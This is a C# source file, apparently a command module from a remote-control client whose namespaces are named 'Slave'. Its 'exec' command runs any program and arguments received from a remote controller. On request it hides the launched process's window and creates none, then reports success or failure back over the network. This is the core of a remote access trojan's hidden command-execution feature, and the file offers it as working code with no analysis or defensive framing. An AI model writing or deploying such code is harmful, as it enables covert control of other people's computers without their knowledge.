using Shared;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using Slave.Core;

namespace Slave.Commands
{
    internal class Execute : ICommand
    {
        public string name { get; set; } = "exec";

        public void Process(List<string> args)
        {
            var startInfo = new ProcessStartInfo(args[0]);
            if (args.Count > 1)
            {
                if (args.Contains("hidden"))
                {
                    startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    startInfo.CreateNoWindow = true;
                }

                if (args.Count == 3)
                {
                    startInfo.Arguments = args[1];
                }
            }

            try
            {
                System.Diagnostics.Process.Start(startInfo);
                SlaveNetworkManager.GetInstance().WriteLine("OK");
            }
            catch (Exception)
            {
                SlaveNetworkManager.GetInstance().WriteLine("KO");
            }
        }
    }
}
